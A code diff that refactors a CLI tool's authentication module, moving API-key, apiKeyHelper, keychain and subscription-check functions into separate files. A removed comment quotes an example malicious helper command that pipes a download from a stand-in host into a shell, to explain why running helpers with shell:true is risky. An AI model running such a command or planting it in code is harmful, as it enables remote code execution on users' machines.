@@ -93,310 +93,43 @@ import {
   getClaudeAIOAuthTokensAsync as _getClaudeAIOAuthTokensAsync,
   checkAndRefreshOAuthTokenIfNeeded as _checkAndRefreshOAuthTokenIfNeeded,
 } from './authClaudeAiOAuth.js'
+import {
+  isAnthropicAuthEnabled as _isAnthropicAuthEnabled,
+  getAuthTokenSource as _getAuthTokenSource,
+  getAnthropicApiKey as _getAnthropicApiKey,
+  hasAnthropicApiKeyAuth as _hasAnthropicApiKeyAuth,
+  getAnthropicApiKeyWithSource as _getAnthropicApiKeyWithSource,
+  getConfiguredApiKeyHelper as _getConfiguredApiKeyHelper,
+  calculateApiKeyHelperTTL as _calculateApiKeyHelperTTL,
+  getApiKeyHelperElapsedMs as _getApiKeyHelperElapsedMs,
+  getApiKeyFromApiKeyHelper as _getApiKeyFromApiKeyHelper,
+  getApiKeyFromApiKeyHelperCached as _getApiKeyFromApiKeyHelperCached,
+  clearApiKeyHelperCache as _clearApiKeyHelperCache,
+  prefetchApiKeyFromApiKeyHelperIfSafe as _prefetchApiKeyFromApiKeyHelperIfSafe,
+  type ApiKeySource as ApiKeySourceType,
+} from './authTokenSource.js'
+import { getApiKeyFromConfigOrMacOSKeychain as _getApiKeyFromConfigOrMacOSKeychain } from './authApiKey.js'
 
 // Internal aliases (used by subscription / account helpers below).
 const getClaudeAIOAuthTokens = _getClaudeAIOAuthTokens
 const getClaudeAIOAuthTokensAsync = _getClaudeAIOAuthTokensAsync
 const getCodexOAuthTokens = _getCodexOAuthTokens
 const checkAndRefreshOAuthTokenIfNeeded = _checkAndRefreshOAuthTokenIfNeeded
+const isAnthropicAuthEnabled = _isAnthropicAuthEnabled
+const getAuthTokenSource = _getAuthTokenSource
+const getAnthropicApiKey = _getAnthropicApiKey
+const hasAnthropicApiKeyAuth = _hasAnthropicApiKeyAuth
+const getAnthropicApiKeyWithSource = _getAnthropicApiKeyWithSource
+const getConfiguredApiKeyHelper = _getConfiguredApiKeyHelper
+const calculateApiKeyHelperTTL = _calculateApiKeyHelperTTL
+const getApiKeyHelperElapsedMs = _getApiKeyHelperElapsedMs
+const getApiKeyFromApiKeyHelper = _getApiKeyFromApiKeyHelper
+const getApiKeyFromApiKeyHelperCached = _getApiKeyFromApiKeyHelperCached
+const clearApiKeyHelperCache = _clearApiKeyHelperCache
+const prefetchApiKeyFromApiKeyHelperIfSafe = _prefetchApiKeyFromApiKeyHelperIfSafe
+const getApiKeyFromConfigOrMacOSKeychain = _getApiKeyFromConfigOrMacOSKeychain
+type ApiKeySource = ApiKeySourceType
 
-/**
- * CCR and Claude Desktop spawn the CLI with OAuth and should never fall back
- * to the user's ~/.freecc/settings.json API-key config (apiKeyHelper,
- * env.ANTHROPIC_API_KEY, env.ANTHROPIC_AUTH_TOKEN). Those settings exist for
- * the user's terminal CLI, not managed sessions. Without this guard, a user
- * who runs `claude` in their terminal with an API key sees every CCD session
- * also use that key — and fail if it's stale/wrong-org.
- */
-function isManagedOAuthContext(): boolean {
-  return (
-    isEnvTruthy(process.env.CLAUDE_CODE_REMOTE) ||
-    process.env.CLAUDE_CODE_ENTRYPOINT === 'claude-desktop'
-  )
-}
-
-/** Whether we are supporting direct 1P auth. */
-// this code is closely related to getAuthTokenSource
-export function isAnthropicAuthEnabled(): boolean {
-  // --bare: API-key-only, never OAuth.
-  if (isBareMode()) return false
-
-  // `claude ssh` remote: ANTHROPIC_UNIX_SOCKET tunnels API calls through a
-  // local auth-injecting proxy. The launcher sets CLAUDE_CODE_OAUTH_TOKEN as a
-  // placeholder iff the local side is a subscriber (so the remote includes the
-  // oauth-2025 beta header to match what the proxy will inject). The remote's
-  // ~/.claude settings (apiKeyHelper, settings.env.ANTHROPIC_API_KEY) MUST NOT
-  // flip this — they'd cause a header mismatch with the proxy and a bogus
-  // "invalid x-api-key" from the API. See src/ssh/sshAuthProxy.ts.
-  if (process.env.ANTHROPIC_UNIX_SOCKET) {
-    return !!process.env.CLAUDE_CODE_OAUTH_TOKEN
-  }
-
-  const is3P =
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_BEDROCK) ||
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_VERTEX) ||
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_FOUNDRY) ||
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_OPENAI)
-
-  // Check if user has configured an external API key source
-  // This allows externally-provided API keys to work (without requiring proxy configuration)
-  const settings = getSettings_DEPRECATED() || {}
-  const apiKeyHelper = settings.apiKeyHelper
-  const hasExternalAuthToken =
-    process.env.ANTHROPIC_AUTH_TOKEN ||
-    apiKeyHelper ||
-    process.env.CLAUDE_CODE_API_KEY_FILE_DESCRIPTOR
-
-  // Check if API key is from an external source (not managed by /login)
-  const { source: apiKeySource } = getAnthropicApiKeyWithSource({
-    skipRetrievingKeyFromApiKeyHelper: true,
-  })
-  const hasExternalApiKey =
-    apiKeySource === 'ANTHROPIC_API_KEY' || apiKeySource === 'apiKeyHelper'
-
-  // Disable Anthropic auth if:
-  // 1. Using 3rd party services (Bedrock/Vertex/Foundry)
-  // 2. User has an external API key (regardless of proxy configuration)
-  // 3. User has an external auth token (regardless of proxy configuration)
-  // this may cause issues if users have complex proxy / gateway "client-side creds" auth scenarios,
-  // e.g. if they want to set X-Api-Key to a gateway key but use Anthropic OAuth for the Authorization
-  // if we get reports of that, we should probably add an env var to force OAuth enablement
-  const shouldDisableAuth =
-    is3P ||
-    (hasExternalAuthToken && !isManagedOAuthContext()) ||
-    (hasExternalApiKey && !isManagedOAuthContext())
-
-  return !shouldDisableAuth
-}
-
-/** Where the auth token is being sourced from, if any. */
-// this code is closely related to isAnthropicAuthEnabled
-export function getAuthTokenSource() {
-  // --bare: API-key-only. apiKeyHelper (from --settings) is the only
-  // bearer-token-shaped source allowed. OAuth env vars, FD tokens, and
-  // keychain are ignored.
-  if (isBareMode()) {
-    if (getConfiguredApiKeyHelper()) {
-      return { source: 'apiKeyHelper' as const, hasToken: true }
-    }
-    return { source: 'none' as const, hasToken: false }
-  }
-
-  if (process.env.ANTHROPIC_AUTH_TOKEN && !isManagedOAuthContext()) {
-    return { source: 'ANTHROPIC_AUTH_TOKEN' as const, hasToken: true }
-  }
-
-  if (process.env.CLAUDE_CODE_OAUTH_TOKEN) {
-    return { source: 'CLAUDE_CODE_OAUTH_TOKEN' as const, hasToken: true }
-  }
-
-  // Check for OAuth token from file descriptor (or its CCR disk fallback)
-  const oauthTokenFromFd = getOAuthTokenFromFileDescriptor()
-  if (oauthTokenFromFd) {
-    // getOAuthTokenFromFileDescriptor has a disk fallback for CCR subprocesses
-    // that can't inherit the pipe FD. Distinguish by env var presence so the
-    // org-mismatch message doesn't tell the user to unset a variable that
-    // doesn't exist. Call sites fall through correctly — the new source is
-    // !== 'none' (cli/handlers/auth.ts → oauth_token) and not in the
-    // isEnvVarToken set (auth.ts:1844 → generic re-login message).
-    if (process.env.CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR) {
-      return {
-        source: 'CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR' as const,
-        hasToken: true,
-      }
-    }
-    return {
-      source: 'CCR_OAUTH_TOKEN_FILE' as const,
-      hasToken: true,
-    }
-  }
-
-  // Check if apiKeyHelper is configured without executing it
-  // This prevents security issues where arbitrary code could execute before trust is established
-  const apiKeyHelper = getConfiguredApiKeyHelper()
-  if (apiKeyHelper && !isManagedOAuthContext()) {
-    return { source: 'apiKeyHelper' as const, hasToken: true }
-  }
-
-  const oauthTokens = getClaudeAIOAuthTokens()
-  if (shouldUseClaudeAIAuth(oauthTokens?.scopes) && oauthTokens?.accessToken) {
-    return { source: 'claude.ai' as const, hasToken: true }
-  }
-
-  return { source: 'none' as const, hasToken: false }
-}
-
-export type ApiKeySource =
-  | 'ANTHROPIC_API_KEY'
-  | 'apiKeyHelper'
-  | '/login managed key'
-  | 'none'
-
-export function getAnthropicApiKey(): null | string {
-  const { key } = getAnthropicApiKeyWithSource()
-  return key
-}
-
-export function hasAnthropicApiKeyAuth(): boolean {
-  const { key, source } = getAnthropicApiKeyWithSource({
-    skipRetrievingKeyFromApiKeyHelper: true,
-  })
-  return key !== null && source !== 'none'
-}
-
-export function getAnthropicApiKeyWithSource(
-  opts: { skipRetrievingKeyFromApiKeyHelper?: boolean } = {},
-): {
-  key: null | string
-  source: ApiKeySource
-} {
-  // --bare: hermetic auth. Only ANTHROPIC_API_KEY env or apiKeyHelper from
-  // the --settings flag. Never touches keychain, config file, or approval
-  // lists. 3P (Bedrock/Vertex/Foundry) uses provider creds, not this path.
-  if (isBareMode()) {
-    if (process.env.ANTHROPIC_API_KEY) {
-      return { key: process.env.ANTHROPIC_API_KEY, source: 'ANTHROPIC_API_KEY' }
-    }
-    if (getConfiguredApiKeyHelper()) {
-      return {
-        key: opts.skipRetrievingKeyFromApiKeyHelper
-          ? null
-          : getApiKeyFromApiKeyHelperCached(),
-        source: 'apiKeyHelper',
-      }
-    }
-    return { key: null, source: 'none' }
-  }
-
-  // On homespace, don't use ANTHROPIC_API_KEY (use Console key instead)
-  // https://anthropic.slack.com/archives/C08428WSLKV/p1747331773214779
-  const apiKeyEnv = isRunningOnHomespace()
-    ? undefined
-    : process.env.ANTHROPIC_API_KEY
-
-  // Always check for direct environment variable when the user ran claude --print.
-  // This is useful for CI, etc.
-  if (preferThirdPartyAuthentication() && apiKeyEnv) {
-    return {
-      key: apiKeyEnv,
-      source: 'ANTHROPIC_API_KEY',
-    }
-  }
-
-  if (isEnvTruthy(process.env.CI) || process.env.NODE_ENV === 'test') {
-    // Check for API key from file descriptor first
-    const apiKeyFromFd = getApiKeyFromFileDescriptor()
-    if (apiKeyFromFd) {
-      return {
-        key: apiKeyFromFd,
-        source: 'ANTHROPIC_API_KEY',
-      }
-    }
-
-    if (
-      !apiKeyEnv &&
-      !process.env.CLAUDE_CODE_OAUTH_TOKEN &&
-      !process.env.CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR
-    ) {
-      throw new Error(
-        'ANTHROPIC_API_KEY or CLAUDE_CODE_OAUTH_TOKEN env var is required',
-      )
-    }
-
-    if (apiKeyEnv) {
-      return {
-        key: apiKeyEnv,
-        source: 'ANTHROPIC_API_KEY',
-      }
-    }
-
-    // OAuth token is present but this function returns API keys only
-    return {
-      key: null,
-      source: 'none',
-    }
-  }
-  // Check for ANTHROPIC_API_KEY before checking the apiKeyHelper or /login-managed key
-  if (
-    apiKeyEnv &&
-    getGlobalConfig().customApiKeyResponses?.approved?.includes(
-      normalizeApiKeyForConfig(apiKeyEnv),
-    )
-  ) {
-    return {
-      key: apiKeyEnv,
-      source: 'ANTHROPIC_API_KEY',
-    }
-  }
-
-  // Check for API key from file descriptor
-  const apiKeyFromFd = getApiKeyFromFileDescriptor()
-  if (apiKeyFromFd) {
-    return {
-      key: apiKeyFromFd,
-      source: 'ANTHROPIC_API_KEY',
-    }
-  }
-
-  // Check for apiKeyHelper — use sync cache, never block
-  const apiKeyHelperCommand = getConfiguredApiKeyHelper()
-  if (apiKeyHelperCommand) {
-    if (opts.skipRetrievingKeyFromApiKeyHelper) {
-      return {
-        key: null,
-        source: 'apiKeyHelper',
-      }
-    }
-    // Cache may be cold (helper hasn't finished yet). Return null with
-    // source='apiKeyHelper' rather than falling through to keychain —
-    // apiKeyHelper must win. Callers needing a real key must await
-    // getApiKeyFromApiKeyHelper() first (client.ts, useApiKeyVerification do).
-    return {
-      key: getApiKeyFromApiKeyHelperCached(),
-      source: 'apiKeyHelper',
-    }
-  }
-
-  const apiKeyFromConfigOrMacOSKeychain = getApiKeyFromConfigOrMacOSKeychain()
-  if (apiKeyFromConfigOrMacOSKeychain) {
-    return apiKeyFromConfigOrMacOSKeychain
-  }
-
-  return {
-    key: null,
-    source: 'none',
-  }
-}
-
-/**
- * Get the configured apiKeyHelper from settings.
- * In bare mode, only the --settings flag source is consulted — apiKeyHelper
- * from ~/.freecc/settings.json or project settings is ignored.
- */
-export function getConfiguredApiKeyHelper(): string | undefined {
-  if (isBareMode()) {
-    return getSettingsForSource('flagSettings')?.apiKeyHelper
-  }
-  const mergedSettings = getSettings_DEPRECATED() || {}
-  return mergedSettings.apiKeyHelper
-}
-
-/**
- * Check if the configured apiKeyHelper comes from project settings (projectSettings or localSettings)
- */
-function isApiKeyHelperFromProjectOrLocalSettings(): boolean {
-  const apiKeyHelper = getConfiguredApiKeyHelper()
-  if (!apiKeyHelper) {
-    return false
-  }
-
-  const projectSettings = getSettingsForSource('projectSettings')
-  const localSettings = getSettingsForSource('localSettings')
-  return (
-    projectSettings?.apiKeyHelper === apiKeyHelper ||
-    localSettings?.apiKeyHelper === apiKeyHelper
-  )
-}
 
 /**
  * AWS-specific helpers (awsAuthRefresh, awsCredentialExport, STS, refresh cache)
@@ -410,188 +143,6 @@ export {
   refreshAndGetAwsCredentials,
   clearAwsCredentialsCache,
 } from './authAws.js'
-
-/**
- * Calculate TTL in milliseconds for the API key helper cache
- * Uses CLAUDE_CODE_API_KEY_HELPER_TTL_MS env var if set and valid,
- * otherwise defaults to 5 minutes
- */
-export function calculateApiKeyHelperTTL(): number {
-  const envTtl = process.env.CLAUDE_CODE_API_KEY_HELPER_TTL_MS
-
-  if (envTtl) {
-    const parsed = parseInt(envTtl, 10)
-    if (!Number.isNaN(parsed) && parsed >= 0) {
-      return parsed
-    }
-    logForDebugging(
-      `Found CLAUDE_CODE_API_KEY_HELPER_TTL_MS env var, but it was not a valid number. Got ${envTtl}`,
-      { level: 'error' },
-    )
-  }
-
-  return DEFAULT_API_KEY_HELPER_TTL
-}
-
-// Async API key helper with sync cache for non-blocking reads.
-// Epoch bumps on clearApiKeyHelperCache() — orphaned executions check their
-// captured epoch before touching module state so a settings-change or 401-retry
-// mid-flight can't clobber the newer cache/inflight.
-let _apiKeyHelperCache: { value: string; timestamp: number } | null = null
-let _apiKeyHelperInflight: {
-  promise: Promise<string | null>
-  // Only set on cold launches (user is waiting); null for SWR background refreshes.
-  startedAt: number | null
-} | null = null
-let _apiKeyHelperEpoch = 0
-
-export function getApiKeyHelperElapsedMs(): number {
-  const startedAt = _apiKeyHelperInflight?.startedAt
-  return startedAt ? Date.now() - startedAt : 0
-}
-
-export async function getApiKeyFromApiKeyHelper(
-  isNonInteractiveSession: boolean,
-): Promise<string | null> {
-  if (!getConfiguredApiKeyHelper()) return null
-  const ttl = calculateApiKeyHelperTTL()
-  if (_apiKeyHelperCache) {
-    if (Date.now() - _apiKeyHelperCache.timestamp < ttl) {
-      return _apiKeyHelperCache.value
-    }
-    // Stale — return stale value now, refresh in the background.
-    // `??=` banned here by eslint no-nullish-assign-object-call (bun bug).
-    if (!_apiKeyHelperInflight) {
-      _apiKeyHelperInflight = {
-        promise: _runAndCache(
-          isNonInteractiveSession,
-          false,
-          _apiKeyHelperEpoch,
-        ),
-        startedAt: null,
-      }
-    }
-    return _apiKeyHelperCache.value
-  }
-  // Cold cache — deduplicate concurrent calls
-  if (_apiKeyHelperInflight) return _apiKeyHelperInflight.promise
-  _apiKeyHelperInflight = {
-    promise: _runAndCache(isNonInteractiveSession, true, _apiKeyHelperEpoch),
-    startedAt: Date.now(),
-  }
-  return _apiKeyHelperInflight.promise
-}
-
-async function _runAndCache(
-  isNonInteractiveSession: boolean,
-  isCold: boolean,
-  epoch: number,
-): Promise<string | null> {
-  try {
-    const value = await _executeApiKeyHelper(isNonInteractiveSession)
-    if (epoch !== _apiKeyHelperEpoch) return value
-    if (value !== null) {
-      _apiKeyHelperCache = { value, timestamp: Date.now() }
-    }
-    return value
-  } catch (e) {
-    if (epoch !== _apiKeyHelperEpoch) return ' '
-    const detail = e instanceof Error ? e.message : String(e)
-    // biome-ignore lint/suspicious/noConsole: user-configured script failed; must be visible without --debug
-    console.error(chalk.red(`apiKeyHelper failed: ${detail}`))
-    logForDebugging(`Error getting API key from apiKeyHelper: ${detail}`, {
-      level: 'error',
-    })
-    // SWR path: a transient failure shouldn't replace a working key with
-    // the ' ' sentinel — keep serving the stale value and bump timestamp
-    // so we don't hammer-retry every call.
-    if (!isCold && _apiKeyHelperCache && _apiKeyHelperCache.value !== ' ') {
-      _apiKeyHelperCache = { ..._apiKeyHelperCache, timestamp: Date.now() }
-      return _apiKeyHelperCache.value
-    }
-    // Cold cache or prior error — cache ' ' so callers don't fall back to OAuth
-    _apiKeyHelperCache = { value: ' ', timestamp: Date.now() }
-    return ' '
-  } finally {
-    if (epoch === _apiKeyHelperEpoch) {
-      _apiKeyHelperInflight = null
-    }
-  }
-}
-
-async function _executeApiKeyHelper(
-  isNonInteractiveSession: boolean,
-): Promise<string | null> {
-  const apiKeyHelper = getConfiguredApiKeyHelper()
-  if (!apiKeyHelper) {
-    return null
-  }
-
-  if (isApiKeyHelperFromProjectOrLocalSettings()) {
-    const hasTrust = checkHasTrustDialogAccepted()
-    if (!hasTrust && !isNonInteractiveSession) {
-      const error = new Error(
-        `Security: apiKeyHelper executed before workspace trust is confirmed. If you see this message, post in ${MACRO.FEEDBACK_CHANNEL}.`,
-      )
-      logAntError('apiKeyHelper invoked before trust check', error)
-      logEvent('tengu_apiKeyHelper_missing_trust11', {})
-      return null
-    }
-  }
-
-  const result = await execa(apiKeyHelper, {
-    // shell:true means a malicious helper string like
-    //   /bin/sh -c 'curl evil.com | sh'
-    // is interpreted as a shell command rather than a single argv[0].
-    // Per project policy (localhost-only, personal machine), we accept
-    // this risk in exchange for supporting helpers that depend on shell
-    // features (pipes, env expansion). A future hardening would
-    // sandbox this with a separate user and argv-quote strictly.
-    shell: true,
-    timeout: 10 * 60 * 1000,
-    reject: false,
-  })
-  if (result.failed) {
-    // reject:false — execa resolves on exit≠0/timeout, stderr is on result
-    const why = result.timedOut ? 'timed out' : `exited ${result.exitCode}`
-    const stderr = result.stderr?.trim()
-    throw new Error(stderr ? `${why}: ${stderr}` : why)
-  }
-  const stdout = result.stdout?.trim()
-  if (!stdout) {
-    throw new Error('did not return a value')
-  }
-  return stdout
-}
-
-/**
- * Sync cache reader — returns the last fetched apiKeyHelper value without executing.
- * Returns stale values to match SWR semantics of the async reader.
- * Returns null only if the async fetch hasn't completed yet.
- */
-export function getApiKeyFromApiKeyHelperCached(): string | null {
-  return _apiKeyHelperCache?.value ?? null
-}
-
-export function clearApiKeyHelperCache(): void {
-  _apiKeyHelperEpoch++
-  _apiKeyHelperCache = null
-  _apiKeyHelperInflight = null
-}
-
-export function prefetchApiKeyFromApiKeyHelperIfSafe(
-  isNonInteractiveSession: boolean,
-): void {
-  // Skip if trust not yet accepted — the inner _executeApiKeyHelper check
-  // would catch this too, but would fire a false-positive analytics event.
-  if (
-    isApiKeyHelperFromProjectOrLocalSettings() &&
-    !checkHasTrustDialogAccepted()
-  ) {
-    return
-  }
-  void getApiKeyFromApiKeyHelper(isNonInteractiveSession)
-}
 
 /**
  * GCP-specific helpers (gcpAuthRefresh, credentials probe, refresh cache,
@@ -614,616 +165,14 @@ export {
  */
 export { prefetchAwsCredentialsAndBedRockInfoIfSafe } from './authAws.js'
 
-/** @private Use {@link getAnthropicApiKey} or {@link getAnthropicApiKeyWithSource} */
-export const getApiKeyFromConfigOrMacOSKeychain = memoize(
-  (): { key: string; source: ApiKeySource } | null => {
-    if (isBareMode()) return null
-    // TODO: migrate to SecureStorage
-    if (process.platform === 'darwin') {
-      // keychainPrefetch.ts fires this read at main.tsx top-level in parallel
-      // with module imports. If it completed, use that instead of spawning a
-      // sync `security` subprocess here (~33ms).
-      const prefetch = getLegacyApiKeyPrefetchResult()
-      if (prefetch) {
-        if (prefetch.stdout) {
-          return { key: prefetch.stdout, source: '/login managed key' }
-        }
-        // Prefetch completed with no key — fall through to config, not keychain.
-      } else {
-        const storageServiceName = getMacOsKeychainStorageServiceName()
-        try {
-          const result = execSyncWithDefaults_DEPRECATED(
-            `security find-generic-password -a $USER -w -s "${storageServiceName}"`,
-          )
-          if (result) {
-            return { key: result, source: '/login managed key' }
-          }
-        } catch (e) {
-          logError(e)
-        }
-      }
-    }
 
-    const config = getGlobalConfig()
-    if (!config.primaryApiKey) {
-      return null
-    }
 
-    return { key: config.primaryApiKey, source: '/login managed key' }
-  },
-)
+// Re-export helpers from extracted modules (originally imported with underscore
+// prefix at the top). Done at the bottom because TypeScript loses the
+// re-export when the same name is used both as a re-export target and as
+// an internal alias in the same file.
 
-function isValidApiKey(apiKey: string): boolean {
-  // Only allow alphanumeric characters, dashes, and underscores
-  return /^[a-zA-Z0-9-_]+$/.test(apiKey)
-}
-
-export async function saveApiKey(apiKey: string): Promise<void> {
-  if (!isValidApiKey(apiKey)) {
-    throw new Error(
-      'Invalid API key format. API key must contain only alphanumeric characters, dashes, and underscores.',
-    )
-  }
-
-  // Store as primary API key
-  await maybeRemoveApiKeyFromMacOSKeychain()
-  let savedToKeychain = false
-  if (process.platform === 'darwin') {
-    try {
-      // TODO: migrate to SecureStorage
-      const storageServiceName = getMacOsKeychainStorageServiceName()
-      const username = getUsername()
-
-      // Convert to hexadecimal to avoid any escaping issues
-      const hexValue = Buffer.from(apiKey, 'utf-8').toString('hex')
-
-      // Use security's interactive mode (-i) with -X (hexadecimal) option
-      // This ensures credentials never appear in process command-line arguments
-      // Process monitors only see "security -i", not the password
-      const command = `add-generic-password -U -a "${username}" -s "${storageServiceName}" -X "${hexValue}"\n`
-
-      await execa('security', ['-i'], {
-        input: command,
-        reject: false,
-      })
-
-      logEvent('tengu_api_key_saved_to_keychain', {})
-      savedToKeychain = true
-    } catch (e) {
-      logError(e)
-      logEvent('tengu_api_key_keychain_error', {
-        error: errorMessage(
-          e,
-        ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
-      })
-      logEvent('tengu_api_key_saved_to_config', {})
-    }
-  } else {
-    logEvent('tengu_api_key_saved_to_config', {})
-  }
-
-  const normalizedKey = normalizeApiKeyForConfig(apiKey)
-
-  // Save config with all updates
-  saveGlobalConfig(current => {
-    const approved = current.customApiKeyResponses?.approved ?? []
-    return {
-      ...current,
-      // Only save to config if keychain save failed or not on darwin
-      primaryApiKey: savedToKeychain ? current.primaryApiKey : apiKey,
-      customApiKeyResponses: {
-        ...current.customApiKeyResponses,
-        approved: approved.includes(normalizedKey)
-          ? approved
-          : [...approved, normalizedKey],
-        rejected: current.customApiKeyResponses?.rejected ?? [],
-      },
-    }
-  })
-
-  // Clear memo cache
-  getApiKeyFromConfigOrMacOSKeychain.cache.clear?.()
-  clearLegacyApiKeyPrefetch()
-}
-
-export function isCustomApiKeyApproved(apiKey: string): boolean {
-  const config = getGlobalConfig()
-  const normalizedKey = normalizeApiKeyForConfig(apiKey)
-  return (
-    config.customApiKeyResponses?.approved?.includes(normalizedKey) ?? false
-  )
-}
-
-export async function removeApiKey(): Promise<void> {
-  await maybeRemoveApiKeyFromMacOSKeychain()
-
-  // Also remove from config instead of returning early, for older clients
-  // that set keys before we supported keychain.
-  saveGlobalConfig(current => ({
-    ...current,
-    primaryApiKey: undefined,
-  }))
-
-  // Clear memo cache
-  getApiKeyFromConfigOrMacOSKeychain.cache.clear?.()
-  clearLegacyApiKeyPrefetch()
-}
-
-async function maybeRemoveApiKeyFromMacOSKeychain(): Promise<void> {
-  try {
-    await maybeRemoveApiKeyFromMacOSKeychainThrows()
-  } catch (e) {
-    logError(e)
-  }
-}
-
-export function isClaudeAISubscriber(): boolean {
-  if (!isAnthropicAuthEnabled()) {
-    return false
-  }
-
-  return shouldUseClaudeAIAuth(getClaudeAIOAuthTokens()?.scopes)
-}
-
-export function isCodexSubscriber(): boolean {
-  // Only treat as Codex subscriber when explicitly using OpenAI provider
-  if (getAPIProvider() !== 'openai') {
-    return false
-  }
-
-  // Codex OAuth tokens
-  const tokens = getCodexOAuthTokens()
-  if (tokens?.accessToken) return true
-
-  // Also treat API key users as OpenAI subscribers so GPT models are shown
-  return !!getGlobalConfig().openaiApiKey
-}
-
-export function isOpenRouterUser(): boolean {
-  if (getAPIProvider() !== 'openrouter') return false
-  return !!getGlobalConfig().openrouterApiKey
-}
-
-export function isAnthropicCompatUser(): boolean {
-  if (getAPIProvider() !== 'anthropicCompat') return false
-  const cfg = getGlobalConfig()
-  return !!cfg.anthropicCompatApiKey && !!cfg.anthropicCompatBaseUrl
-}
-
-/**
- * Check if the current OAuth token has the user:profile scope.
- *
- * Real /login tokens always include this scope. Env-var and file-descriptor
- * tokens (service keys) hardcode scopes to ['user:inference'] only. Use this
- * to gate calls to profile-scoped endpoints so service key sessions don't
- * generate 403 storms against /api/oauth/profile, bootstrap, etc.
- */
-export function hasProfileScope(): boolean {
-  return (
-    getClaudeAIOAuthTokens()?.scopes?.includes(CLAUDE_AI_PROFILE_SCOPE) ?? false
-  )
-}
-
-export function is1PApiCustomer(): boolean {
-  // 1P API customers are users who are NOT:
-  // 1. Claude.ai subscribers (Max, Pro, Enterprise, Team)
-  // 2. Vertex AI users
-  // 3. AWS Bedrock users
-  // 4. Foundry users
-
-  // Exclude Vertex, Bedrock, and Foundry customers
-  if (
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_BEDROCK) ||
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_VERTEX) ||
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_FOUNDRY)
-  ) {
-    return false
-  }
-
-  // Exclude Claude.ai subscribers
-  if (isClaudeAISubscriber()) {
-    return false
-  }
-
-  // Everyone else is an API customer (OAuth API customers, direct API key users, etc.)
-  return true
-}
-
-/**
- * Gets OAuth account information when Anthropic auth is enabled.
- * Returns undefined when using external API keys or third-party services.
- */
-export function getOauthAccountInfo(): AccountInfo | undefined {
-  return isAnthropicAuthEnabled() ? getGlobalConfig().oauthAccount : undefined
-}
-
-/**
- * Checks if overage/extra usage provisioning is allowed for this organization.
- * This mirrors the logic in apps/claude-ai `useIsOverageProvisioningAllowed` hook as closely as possible.
- */
-export function isOverageProvisioningAllowed(): boolean {
-  const accountInfo = getOauthAccountInfo()
-  const billingType = accountInfo?.billingType
-
-  // Must be a Claude subscriber with a supported subscription type
-  if (!isClaudeAISubscriber() || !billingType) {
-    return false
-  }
-
-  // only allow Stripe and mobile billing types to purchase extra usage
-  if (
-    billingType !== 'stripe_subscription' &&
-    billingType !== 'stripe_subscription_contracted' &&
-    billingType !== 'apple_subscription' &&
-    billingType !== 'google_play_subscription'
-  ) {
-    return false
-  }
-
-  return true
-}
-
-// Returns whether the user has Opus access at all, regardless of whether they
-// are a subscriber or PayG.
-export function hasOpusAccess(): boolean {
-  const subscriptionType = getSubscriptionType()
-
-  return (
-    subscriptionType === 'max' ||
-    subscriptionType === 'enterprise' ||
-    subscriptionType === 'team' ||
-    subscriptionType === 'pro' ||
-    // subscriptionType === null covers both API users and the case where
-    // subscribers do not have subscription type populated. For those
-    // subscribers, when in doubt, we should not limit their access to Opus.
-    subscriptionType === null
-  )
-}
-
-export function getSubscriptionType(): SubscriptionType | null {
-  // Check for mock subscription type first (ANT-only testing)
-  if (shouldUseMockSubscription()) {
-    return getMockSubscriptionType()
-  }
-
-  if (!isAnthropicAuthEnabled()) {
-    return null
-  }
-  const oauthTokens = getClaudeAIOAuthTokens()
-  if (!oauthTokens) {
-    return null
-  }
-
-  return oauthTokens.subscriptionType ?? null
-}
-
-export function isMaxSubscriber(): boolean {
-  return getSubscriptionType() === 'max'
-}
-
-export function isTeamSubscriber(): boolean {
-  return getSubscriptionType() === 'team'
-}
-
-export function isTeamPremiumSubscriber(): boolean {
-  return (
-    getSubscriptionType() === 'team' &&
-    getRateLimitTier() === 'default_claude_max_5x'
-  )
-}
-
-export function isEnterpriseSubscriber(): boolean {
-  return getSubscriptionType() === 'enterprise'
-}
-
-export function isProSubscriber(): boolean {
-  return getSubscriptionType() === 'pro'
-}
-
-export function getRateLimitTier(): string | null {
-  if (!isAnthropicAuthEnabled()) {
-    return null
-  }
-  const oauthTokens = getClaudeAIOAuthTokens()
-  if (!oauthTokens) {
-    return null
-  }
-
-  return oauthTokens.rateLimitTier ?? null
-}
-
-export function getSubscriptionName(): string {
-  const subscriptionType = getSubscriptionType()
-
-  switch (subscriptionType) {
-    case 'enterprise':
-      return 'Claude Enterprise'
-    case 'team':
-      return 'Claude Team'
-    case 'max':
-      return 'Claude Max'
-    case 'pro':
-      return 'Claude Pro'
-    default:
-      return 'Claude API'
-  }
-}
-
-/** Check if using third-party services (Bedrock or Vertex or Foundry) */
-export function isUsing3PServices(): boolean {
-  return !!(
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_BEDROCK) ||
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_VERTEX) ||
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_FOUNDRY) ||
-    isEnvTruthy(process.env.CLAUDE_CODE_USE_OPENAI)
-  )
-}
-
-/**
- * Get the configured otelHeadersHelper from settings
- */
-function getConfiguredOtelHeadersHelper(): string | undefined {
-  const mergedSettings = getSettings_DEPRECATED() || {}
-  return mergedSettings.otelHeadersHelper
-}
-
-/**
- * Check if the configured otelHeadersHelper comes from project settings (projectSettings or localSettings)
- */
-export function isOtelHeadersHelperFromProjectOrLocalSettings(): boolean {
-  const otelHeadersHelper = getConfiguredOtelHeadersHelper()
-  if (!otelHeadersHelper) {
-    return false
-  }
-
-  const projectSettings = getSettingsForSource('projectSettings')
-  const localSettings = getSettingsForSource('localSettings')
-  return (
-    projectSettings?.otelHeadersHelper === otelHeadersHelper ||
-    localSettings?.otelHeadersHelper === otelHeadersHelper
-  )
-}
-
-// Cache for debouncing otelHeadersHelper calls
-let cachedOtelHeaders: Record<string, string> | null = null
-let cachedOtelHeadersTimestamp = 0
